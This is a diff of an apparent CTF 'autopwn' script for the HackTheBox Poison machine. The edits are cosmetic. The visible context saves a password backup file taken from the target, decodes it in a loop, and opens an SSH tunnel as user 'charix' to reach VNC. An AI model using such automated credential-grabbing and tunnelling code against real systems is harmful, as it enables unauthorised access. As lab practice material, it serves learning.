@@ -1,5 +1,5 @@
 #Author:w33ge
-#Twitter-> https://twitter.com/00xnc
+#Twitter-> https://twitter.com/W33gee
 #Autopwn Poison machine hackthebox
 #!/usr/bin/python
 import requests
@@ -7,7 +7,6 @@ import os
 import base64
 import time
 import paramiko
-from paramiko import SSHClient
 import sys
 
 mydir = str(os.getcwd())
@@ -16,7 +15,6 @@ r = req.text
 file3 = open('%s/pwdbackup' % mydir, 'w')
 file3.write(r)
 file3.close()
-
 try:
     for i in range(13):
         if i == 0:
@@ -77,8 +75,6 @@ try:
 	    os.system('lsof -ti:5901 | xargs kill -9')
 	    os.system('ssh -L 5901:127.0.0.1:5901 -N -f -l charix 10.10.10.84')
 	    print("tunneling OK!")
-
 except:
-
 	print("[ssh connection failed]")
 	print("[please, check your user/pass in the source code]")
